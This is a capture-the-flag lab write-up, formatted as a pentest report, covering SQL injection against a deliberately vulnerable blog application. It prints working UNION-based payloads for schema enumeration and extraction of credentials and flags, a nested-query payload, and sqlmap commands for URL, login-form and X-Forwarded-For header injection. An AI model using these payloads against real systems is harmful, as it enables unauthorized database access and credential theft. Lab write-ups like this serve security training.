# SQHell Report 

## Summary

<span>&nbsp;</span>

| Risk | Impact | Severity |
| --- | --- | --- |
| SQL Injection | Full DB compromise  | Critical |
| Weak Input Handling | Information leakage | High |


<span>&nbsp;</span>

## Scope
Assessment of multiple endpoints across a vulnerable web application designed to emulate common SQL injection vectors and improper database handling.

<span>&nbsp;</span>

## Methodology
The testing approach included:
- Manual probing and payload injection via browser
- HTTP request manipulation using Burp Suite
- Automated exploitation and enumeration using sqlmap

Focus was placed on discovering SQL injection vulnerabilities through both URL parameters and HTTP headers, identifying database schema and extracting sensitive data.
<span>&nbsp;</span>

## Environment Overview
The target application is a vulnerable web service simulating a basic blog and user management system. The backend uses a MySQL database, as confirmed via error messages and SQL enumeration. The following endpoints were found to be vulnerable to SQL injection:
- /post?id= 
- /terms-and-conditions 
- /register/user-check?username=
- /user?id= 
- /login 

<span>&nbsp;</span>

## Identified Vulnerabilities
###  Union-based SQL Injection in `/post?id=`
- **Vector:** URL parameter(id).

- **Proof of Concept**:   
    ```SQL
    /post?id=2'
    ```

- **Impact:** - Full database enumeration including table/column disclosure and data extraction from arbitrary tables (flag, users). Confirmed MySQL backend.

<span>&nbsp;</span>

## Identified Vulnerabilities
###  Union-based SQL Injection in `/user?id=`
- **Vector:** - URL parameter(id).

- **Proof of Concept**:   
    ```SQL
    /user?id=1 UNION SELECT 1,2,3-- -
    ```

- **Impact:** - Unauthorized access to the sqhell_4 schema, including user credentials and potential access tokens.

<span>&nbsp;</span>

## Identified Vulnerabilities
### Error-based / Boolean-based SQL Injection in `/register/user-check`
- **Vector:** Query string parameter (username).

- **Proof of Concept**:   
    ```
    sqlmap -u "http://$ip/register/user-check?username=*" --dbms=mysql --batch --level=3 --risk=3
    ```

- **Impact:** Full access to sqhell_3 including extraction from sensitive tables like flag.


<span>&nbsp;</span>

### Time-based / Error-based SQL Injection via HTTP Header (X-Forwarded-For)
- **Vector:** X-Forwarded-For HTTP header.

- **Proof of Concept**:   
    ```
    sqlmap -u "http://$ip/terms-and-conditions" --headers="X-Forwarded-For: 127.0.0.1*" --dbms=mysql --batch
    ```

- **Impact:** Enabled enumeration and exfiltration of data from the sqhell_1 database, including flags. Bypasses traditional input validation layers.

<span>&nbsp;</span>

### - Blind SQL Injection on /login
- **Vector:** POST parameters (username).

- **Proof of Concept**:   
    ```
    sqlmap -r request.txt --dbms=mysql --batch --level=3 --risk=3
    ```

- **Impact:** Extraction of credentials from sqhell_2. Privilege escalation and access to protected content (e.g., admin-only flag).

<span>&nbsp;</span>

## Walktrough
At the start there is blog site.  

![alt text](image.png)

The second blog post is selected for initial testing.
```BASH
/post?id=2
```

The id parameter is likely used in a backend SQL query such as:

```SQL
SELECT * from blog where id=2...
```

Add a single quote after id number to test for SQL injection.

![alt text](image-1.png)

This returns an SQL syntax error, confirming that user input is not properly sanitized and is directly inserted into an SQL query. The error message also confirms that the backend database is MySQL.

<span>&nbsp;</span>

Use a UNION SELECT payload to identify how many columns the original query returns. A response with no error indicates there are four columns.
```BASH
/post?id=2 UNION SELECT 1,2,3,4
```
![alt text](image-31.png)

The next step is to extract database information using built-in MySQL functions such as DATABASE() and VERSION().
```BASH
/post?id=-1 UNION SELECT 1,DATABASE(),VERSION(),4- -
```  
![alt text](image-32.png)

The query reveals that the current database in use is named sqhell_5.

<span>&nbsp;</span>

Table information can be retrieved in two ways: manually through injection or using automation tools like sqlmap.
1. SQL injection via URL:
```BASH
/post?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='sqhell_5'),3,4-- -
```
![alt text](image-33.png) 

```BASH
/post?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag'),3,4-- -
```
![alt text](image-36.png)

```BASH
/post?id=-1 UNION SELECT 1,(SELECT flag FROM flag LIMIT 0,1),3,4-- -
```
![alt text](image-37.png)

<span>&nbsp;</span>

2. Use sqlmap
```BASH
sqlmap -u "http://10.10.208.55/post?id=2" --dbms=mysql -D sqhell_5 --tables --batch
```

![alt text](image-34.png)

The sqhell_5 database contains three tables: flag, posts, and users. The contents of the flag table are dumped next.
```BASH
sqlmap -u "http://10.10.208.55/post?id=1" -D sqhell_5 -T flag --dump --batch
```
![alt text](image-35.png)  

<span>&nbsp;</span>

A hint in the "Terms and Conditions" page mentions IP logging, suggesting that IP addresses may be stored directly in the database, which is a possible injection point.
```BASH
sqlmap -u "http://10.10.171.55/terms-and-conditions" --headers="X-Forwarded-For: 127.0.0.1*" --dbms=mysql --batch
```

![alt text](image-9.png)  

Since HTTP headers cannot be modified directly via the browser, sqlmap is used to test for injection through the X-Forwarded-For header.
``` BASH
sqlmap -u "http://10.10.171.55/terms-and-conditions" --headers="X-Forwarded-For: 10.10.199.236*" --dbms=mysql --batch --technique=T --dbs
``` 

![alt text](image-10.png)

The sqhell_1 schema is then enumerated to identify its tables.
``` BASH
sqlmap -u "http://10.10.171.55/terms-and-conditions" --headers="X-Forwarded-For: 10.10.199.236*" --dbms=mysql --batch --technique=T -D sqhell_1 --tables
``` 

Data is extracted from the flag table within the sqhell_1 database.

![alt text](image-11.png)

``` BASH
sqlmap -u "http://10.10.171.55/terms-and-conditions" --headers="X-Forwarded-For: 10.10.199.236*" --dbms=mysql --batch --technique=T -D sqhell_1 -T flag --dump
``` 

![alt text](image-12.png)

<span>&nbsp;</span>

The application also includes login and registration functionality. The registration page is checked to verify whether an admin user already exists.

![alt text](image-17.png)  

This confirms that an admin account is already present in the database. Catch POST request in Burp:  

![alt text](image-18.png)  

The intercepted login request is saved to a file and used with sqlmap to test the login form for SQL injection.
```BASH
sqlmap -r request.txt --dbms=mysql --batch --level=3 --risk=3
```

![alt text](image-19.png)

The login form is found to be vulnerable to multiple forms of blind SQL injection, including boolean-based, time-based, and stacked queries.

Check for db name:
```BASH
sqlmap -r request.txt -p username --dbms=mysql --batch --current-db
```  

![alt text](image-20.png)

![alt text](image-21.png)

The extracted data reveals a users table containing valid user credentials, including plaintext passwords. 
```BASH
sqlmap -r request.txt -p username --dbms=mysql --batch -D sqhell_2 -T users --dump
```
![alt text](image-22.png)

Using the admin credentials, it is possible to log in and access a page containing flag1.  

![alt text](image-23.png)

Right now we know about sqhell_1, sqhell_2, sqhell_4 and sqhell_5. What about sqhell_3?

Although new registrations are disabled, the application still performs live checks against existing usernames. Exploit user-check directly if possible by sqlmap. 
```BASH
sqlmap -u "http://10.10.134.97/register/user-check?username=*" --dbms=mysql --batch --level=3 --risk=3
```

![alt text](image-24.png)

The next step is to determine which database is being used by this endpoint.
```BASH
sqlmap -u "http://10.10.134.97/register/user-check?username=*" --dbms=mysql --batch --current-db
```

![alt text](image-25.png)

The active database is identified as sqhell_3, and its tables are enumerated.
```BASH
sqlmap -u "http://10.10.134.97/register/user-check?username=*" --dbms=mysql --batch -D sqhell_3 --tables
```

![alt text](image-26.png)

Get flag.
```BASH
sqlmap -u "http://10.10.134.97/register/user-check?username=*" --dbms=mysql --batch -D sqhell_3 -T flag --dump
```
![alt text](image-27.png)

<span>&nbsp;</span>

The final endpoint of interest is the /user page.
There are two ways:
1. SQL injection via URL:
```BASH
/user?id=1 UNION SELECT 1,2,3-- -
```
![alt text](image-38.png)

```BASH
/user?id=-1 UNION SELECT 1,DATABASE(),VERSION()-- -
```
![alt text](image-39.png)

```BASH
/user?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='sqhell_4'),3-- -
```
![alt text](image-41.png)

```BASH
/user?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),3-- -
```
![alt text](image-42.png)

```BASH
/user?id=-1 UNION SELECT 1,(SELECT CONCAT(password, ':', username) FROM users LIMIT 0,1),3-- -
```
![alt text](image-43.png)

<span>&nbsp;</span>

2. Use sqlmap
sqlmap is used to enumerate tables and extract their contents from the sqhell_4 database. 
```BASH
sqlmap -u "10.10.134.97/user?id=1" --dbms=mysql --batch --current-db

sqlmap -u "10.10.134.97/user?id=1" --dbms=mysql --batch -D sqhell_4 --tables

sqlmap -u "10.10.134.97/user?id=1" --dbms=mysql --batch -D sqhell_4 -T users --dump
```
![alt text](image-29.png)

If the previous methods fail to extract the flag, a crafted payload can be used to retrieve it by injecting a nested query.
```BASH
http://10.10.134.97/user?id=2 UNION SELECT "1 UNION SELECT null,flag,null,null from flag",null,null FROM information_schema.tables WHERE table_schema=database()
```
![alt text](image-30.png)

